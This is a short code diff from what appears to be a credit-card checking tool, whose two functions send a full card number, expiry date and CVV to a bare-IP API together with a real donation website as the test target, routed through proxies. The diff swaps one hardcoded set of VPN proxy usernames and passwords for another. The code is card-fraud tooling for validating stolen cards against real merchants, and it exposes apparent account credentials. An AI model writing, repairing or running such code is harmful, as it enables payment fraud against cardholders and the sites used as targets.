@@ -230,7 +230,7 @@ async def check_card_random_site(card, sites, user_id=None):
         # Build API URL with new endpoint
         url = f'http://108.165.12.183:8081/?cc=5509890034877216|06|2028|333&url=https://anseladams.org'
         if proxy_str:
-            url += f'&proxy=px023005.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs'
+            url += f'&proxy=purevpn0s2232045:hww8fqbr72j0@px051005.pointtoserver.com:10780'
         
         timeout = aiohttp.ClientTimeout(total=100)
         async with aiohttp.ClientSession(timeout=timeout) as session:
@@ -308,7 +308,7 @@ async def check_card_specific_site(card, site, user_id=None):
         # Build API URL with new endpoint
         url = f'http://108.165.12.183:8081/?cc=5509890034877216|06|2028|333&url=https://anseladams.org'
         if proxy_str:
-            url += f'&proxy=px023005.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs'
+            url += f'&proxy=purevpn0s2232045:hww8fqbr72j0@px051005.pointtoserver.com:10780'
             
         timeout = aiohttp.ClientTimeout(total=100)
         async with aiohttp.ClientSession(timeout=timeout) as session:
